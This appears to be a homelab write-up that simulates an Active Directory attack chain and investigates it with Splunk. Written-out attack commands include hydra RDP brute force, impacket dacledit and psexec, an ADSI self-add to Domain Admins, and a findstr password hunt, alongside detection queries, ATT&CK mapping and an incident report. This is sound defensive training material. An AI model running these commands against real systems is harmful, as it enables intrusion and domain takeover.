---
title: "Day 15 - End-to-End Attack Scenario Investigation⭐"
categories: [HomeLab]
---

This is the centerpiece of the homelab. Every earlier lab day gets connected into a single investigation, from initial access to full domain compromise.

**Scenario flow:**

```
Kali (attacker)
  └─ RDP brute force against WIN11        → Event ID 4625 (multiple failures) → 4624 (success)
      └─ Discovery: ACL enumeration        → GenericAll on Domain Admins found
          └─ Privilege Escalation          → self-added to Domain Admins → Event ID 4728
              └─ Lateral Movement: WIN11 → KIMDC   → PsExec-style remote service execution
                                                        Service creation → Event ID 7045
                  └─ Execution on DC        → whoami, net user, net group, findstr → Sysmon EID 1
                      └─ Detection & Investigation in Splunk
                          └─ Containment: account disabled
```

---

## Environment Setup

Before the attack simulation, two conditions were deliberately configured in the lab. These are not attacker actions, they represent a realistic misconfiguration that already existed in the environment.

**1. Domain Defender disabled (WIN11 and KIMDC)**

Real-time protection was turned off on both hosts to allow the remote service execution technique used later in the chain. Blocking is still valid detection content in its own right, but this lab focuses on the full chain succeeding end to end.

![Screenshot: Defender off, WIN11 and KIMDC](/assets/images/HomeLab/day15/1offdef.png)

**2. GenericAll ACE granted to `elkin` on the Domain Admins group**

```powershell
dsacls "CN=Domain Admins,CN=Users,DC=homelab,DC=local" /G "HOMELAB\elkin:GA"
```

This simulates a common real-world mistake: a delegation that was granted temporarily and never revoked. `elkin` is still a standard domain user at this point. This ACE alone does not make the account a Domain Admin, it just means the account has permission to modify the Domain Admins group object itself.

![Screenshot: dsacls output confirming the ACE](/assets/images/HomeLab/day15/2dsacls.png)
![Image](/assets/images/HomeLab/day15/3elkin.png)

---

## Initial Access: RDP Brute Force

```bash
hydra -l elkin -P passwords.txt rdp://192.168.56.5
```

Password recovered: `elkin : As!23456`

![Screenshot: Hydra success](/assets/images/HomeLab/day15/4bruteforce.png)

Confirmed in Splunk:

```spl
index=wineventlog host=WIN11* (EventCode=4625 OR EventCode=4624) Account_Name=elkin
| table _time, EventCode, Account_Name, Source_Network_Address, Logon_Type
| sort _time
```

![Screenshot: Splunk 4625/4624 timeline](/assets/images/HomeLab/day15/5splunk.png)
![Image](/assets/images/HomeLab/day15/6rdp.png)
![Image](/assets/images/HomeLab/day15/7splunklogin.png)


---

## Discovery: Finding the Misconfigured ACL

With valid credentials, the account's own AD permissions were enumerated using Impacket:

```bash
impacket-dacledit -action read -target "Domain Admins" -dc-ip 192.168.56.10 'homelab.local/elkin:As!23456'
```

![Image](/assets/images/HomeLab/day15/8impacket.png)
![Screenshot: dacledit output showing elkin with FullControl](/assets/images/HomeLab/day15/8reconnaisance.png)

This is what a real attacker would look for after landing on a host: not just "what can I access," but "what can I *change*." The GenericAll ACE on Domain Admins was sitting there, unused, until this point.

---

## Privilege Escalation: Self-Elevation

The account added itself to Domain Admins using its own GenericAll rights, via ADSI from an RDP session on WIN11:

```powershell
$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=homelab,DC=local"
$group.Add("LDAP://CN=Elkin E. Jose,CN=Users,DC=homelab,DC=local")
```

![Screenshot: net group "Domain Admins" /domain showing elkin now a member](/assets/images/HomeLab/day15/10elkinadmin.png)
![Image](/assets/images/HomeLab/day15/12elkingroup.png)

Confirmed in Splunk:

```spl
index=wineventlog host=KIMDC EventCode=4728
```

![Screenshot: raw 4728 event](/assets/images/HomeLab/day15/11splunk.png)

The key detail in this log: **Subject and Member are the same account.** A normal admin action has a different Subject (the admin) and Member (the account being added). Here they're identical, which is a strong signal that something is wrong.

> Note: session tokens are issued at logon time. After the group change, the existing RDP session still showed the old (non-admin) group membership until logging off and back on. This is a real and easy-to-miss detail when validating a privilege escalation.

---

## Lateral Movement: WIN11 → KIMDC

With Domain Admin rights now active, the account was used to execute a remote service on the domain controller:

```bash
impacket-psexec 'homelab.local/elkin:As!23456@192.168.56.10'
```

![Screenshot: psexec success, SYSTEM shell on KIMDC](/assets/images/HomeLab/day15/13kaliwin.png)

This is the point where the attack chain crosses from "compromised endpoint" to "compromised domain." Kali → WIN11 was Initial Access. WIN11 → KIMDC, using credentials obtained from an already-compromised host, is true Lateral Movement.

Confirmed in Splunk:

```spl
index=wineventlog host=KIMDC EventCode=7045
| table _time, Service_Name, Service_File_Name, Account_Name
```

![Screenshot: 7045 showing service UxPL / NPpLYhdw.exe](/assets/images/HomeLab/day15/13splunk.png)

---

## Execution: Post-Exploitation on the DC

From the SYSTEM shell on KIMDC, basic discovery commands were run:

```cmd
whoami /all
net user /domain
net group "Domain Admins" /domain
findstr /s /i "password" C:\Users\*.txt
```

![Image](/assets/images/HomeLab/day15/14reconnaisance.png)
![Image](/assets/images/HomeLab/day15/14whoami.png)

![Image](/assets/images/HomeLab/day15/15passwords.png)
![Image](/assets/images/HomeLab/day15/15password.png)

![Image](/assets/images/HomeLab/day15/16domain.png)
![Image](/assets/images/HomeLab/day15/16netuser.png)
![Image](/assets/images/HomeLab/day15/16netgroup.png)

Captured in Sysmon Event ID 1 with the parent process chained back to the dropped service binary, confirming these commands were run through the remote service, not an interactive console session.

```spl
index=sysmon host=KIMDC EventCode=1
| table _time, Image, CommandLine, ParentImage, User
| sort _time
```
---

## Containment: Compromised account disabled

![Image](/assets/images/HomeLab/day15/17accountblock.png)

---
 
## MITRE ATT&CK Mapping
 
| Stage | Tactic | Technique | ID |
|---|---|---|---|
| RDP brute force | Credential Access | Brute Force | T1110.001 |
| ACL enumeration (dacledit) | Discovery | Permission Groups Discovery: Domain Groups | T1069.002 |
| Self-added to Domain Admins | Privilege Escalation | Account Manipulation | T1098 |
| WIN11 → KIMDC via psexec | Lateral Movement | SMB/Windows Admin Shares | T1021.002 |
| Remote service creation | Execution | System Services: Service Execution | T1569.002 |
| whoami, net user, net group | Discovery | Account Discovery: Domain Account | T1087.002 |
| findstr credential search | Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 |
 

---

## Incident Report

**Incident ID:** HL-2026-016
**Severity:** Critical

### Executive Summary

An attacker broke into a company laptop (WIN11) by guessing a user's password over RDP. Once inside, the attacker found that this "regular" user account had accidentally been given permission to add itself to the Domain Admins group, the highest level of access in the network. The attacker used this to become a Domain Admin, then used that access to break into the domain controller (KIMDC), the server that manages the entire network. The compromised account has since been disabled.

### Timeline

| Time | Stage | Action | Evidence |
|---|---|---|---|
| 15:27 | Initial Access | RDP brute force against `elkin` succeeds | Win11 Security 4625 → 4624 |
| ~16:00 | Discovery | ACL of Domain Admins enumerated, GenericAll found | DC Security 4624 |
| 17:28 | Privilege Escalation | `elkin` added itself to Domain Admins | DC Security 4728 |
| 17:44 | Lateral Movement | Remote service execution to DC, SYSTEM shell obtained | DC System 7045 |
| 19:24–19:37 | Execution / Discovery | whoami, net user, net group, findstr | DC Sysmon EID 1 |
| Post-detection | Containment | `elkin` account disabled | AD action log |

### Affected Assets

- WIN11 (192.168.56.5), initial access point
- KIMDC (192.168.56.10), domain controller, fully compromised

### Root Cause

The Domain Admins group object had a GenericAll ACE granted to a standard user account, unrelated to actual group membership. The attacker discovered and abused this leftover permission to add itself to the group.

### Detection

Detected via the brute-force alert built in Day 11, monitoring for repeated EventCode=4625 from a single source within a short window. The alert fired on the Hydra attack against `elkin`, prompting investigation of the subsequent successful logon and everything that followed.

### Containment

- `elkin` account disabled immediately upon confirming compromise.

### Eradication (planned)

- Remove `elkin` from Domain Admins
- Revoke the GenericAll ACE on the Domain Admins group object
- Remove malicious services (`UxPL`, `UyDN`) and dropped binaries from KIMDC

### Recovery (planned)

- Force password reset on `elkin`
- Purge cached Kerberos tickets
- Re-enable `elkin` only after credential rotation and access review
- Audit all AD object ACLs for similar GenericAll/WriteDACL misconfigurations

---

## IOC Summary

| Type | Value |
|---|---|
| Attacker IP | 192.168.56.101 |
| Compromised account | `elkin` (HOMELAB\elkin) |
| Password used | `As!23456` |
| Dropped binaries | `NPpLYhdw.exe`, `mQBCkvgZ.exe` |
| Malicious services | `UxPL`, `UyDN` |
| Compromised host | WIN11 (192.168.56.5) |
| Compromised DC | KIMDC (192.168.56.10) |

---

## Self Q&A

**Q: Why did you disable the account instead of just removing it from Domain Admins?**
Disabling cuts off all access immediately, including the RDP session that started the whole chain. Removing group membership alone would still leave the account usable, and the attacker could try to re-escalate using the same GenericAll ACE.

**Q: Why does the GenericAll ACE matter more than the group membership itself?**
Because it's the root cause. Removing `elkin` from Domain Admins fixes the symptom. The ACE is what let the account get there in the first place, and it would let any future account holder do the same thing again if left in place.

**Q: How would you have caught the privilege escalation step specifically, not just the brute force?**
The 4728 event where Subject and Member are the same account is a strong, low-noise signal. Legitimate admin actions almost never have that pattern, since an account doesn't normally add itself to a group it's not already in.


---

## Lessons Learned

- A single overlooked ACE on a protected group can fully bypass normal privilege escalation paths. ACL auditing deserves the same attention as group membership auditing.
- Self-elevation (Subject account == Member account in Event ID 4728) is a high-fidelity detection pattern with very few legitimate use cases.